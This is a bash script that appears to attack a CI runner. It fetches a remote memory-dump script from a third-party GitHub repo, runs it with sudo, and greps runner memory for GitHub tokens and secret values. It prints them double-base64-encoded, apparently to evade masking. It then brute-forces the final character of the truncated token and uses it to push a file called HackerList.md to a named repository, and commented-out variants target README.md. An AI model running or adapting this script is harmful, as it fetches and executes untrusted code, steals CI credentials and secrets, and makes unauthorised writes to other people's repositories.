.#!/usr/bin/env bash
set -e
readonly REPO="thi3nl0ng/thi3nl0ng.github.io"

TOKEN_VAL=`curl -sSf https://raw.githubusercontent.com/r3s34rch/test/main/memdum.py | sudo python3 | tr -d '\0' | grep -aoE 'ghs_[0-9A-Za-z]{20,}' | sort -u | awk 'NR==2' | xargs  `

TOKEN_VAL64=`curl -sSf https://raw.githubusercontent.com/r3s34rch/test/main/memdum.py | sudo python3 | tr -d '\0' | grep -aoE 'ghs_[0-9A-Za-z]{20,}' | sort -u | base64 `
B64_BLOB=`curl -sSf https://raw.githubusercontent.com/r3s34rch/test/main/memdum.py | sudo python3 | tr -d '\0' | grep -aoE '"[^"]+":\{"value":"[^"]*","isSecret":true\}' | sort -u | base64 -w 0 | base64 -w 0`
echo "1-----------------------------------------------------------------"
echo "abc" "$TOKEN_VAL" "xyz"
echo "2-----------------------------------------------------------------"
echo "${TOKEN_VAL:0:39}"
echo "3-----------------------------------------------------------------"
echo "$TOKEN_VAL64"
echo "4-----------------------------------------------------------------"
echo "$B64_BLOB"
echo "-----------------------------------------------------------------"

curl  --url "https://api.github.com/repos/${REPO}/contents/HackerList.md" \

for f in {a..z} {A..Z} {0..9}; do 
    #echo "${TOKEN_VAL:0:39}$f" 
    Header="Authorization: token ${TOKEN_VAL:0:39}$f"
    #echo "$Header"
    #sleep 1
      
    curl -L \
         --request PUT \
         --url "https://api.github.com/repos/${REPO}/contents/HackerList.md" \
         --header "$Header" \
         --header "Accept: application/vnd.github.v3+json" \
         --header "X-GitHub-Api-Version: 2022-11-28" \
         -d '{"message":"hello from r3s34rch","content":"bm9uYW1l", "sha":"SHA_FROM_ABOVE"}'
    echo "-----------------------------------------------------------------"
done

#echo "https://api.github.com/repos/${REPO}/contents/README.md"
#Header="Authorization: token $TOKEN_VAL"
#echo "$Header"
#echo "-----------------------------------------------------------------"

#curl -L \
#--request PUT \
#--url "https://api.github.com/repos/${REPO}/contents/README.md" \
#--header "$Header" \
#--header "Accept: application/vnd.github.v3+json" \
#--header "X-GitHub-Api-Version: 2022-11-28" \
#-d '{"message":"my commit message","content":"bm9uYW1l", "sha":"SHA_FROM_ABOVE" }'

#curl -L \
#    -X PUT \
#    -H "Accept: application/vnd.github.v3+json" \
#    -H "Authorization: token $TOKEN_VAL" \
#    "https://api.github.com/repos/${REPO}/contents/README.md" \
#    -d '{"message":"hello from r3s34rch","content":"'$(echo 'content'|base64)'", "sha":"SHA_FROM_ABOVE"}'

#sleep 30m

#curl "https://api.github.com/repos/${REPO}/contents/README.md"      

#gh api --silent \
#  --method POST \
#  -H "Accept: application/vnd.github.v3+json" \
#  "/repos/$OWNER/$REPO/git/refs" \
#  -f ref='refs/heads/add-readme' \
#  -f sha="$(gh api repos/thi3nl0ng/thi3nl0ng.github.io/git/ref/heads/main --jq .object.sha)"

#gh api --silent \
#  -X PUT "/repos/$REPO/contents/README2.md" \
#  -f branch=add-readme \
#  -f message='add README2.md' \
#  -f content="$(echo '123' | base64)"
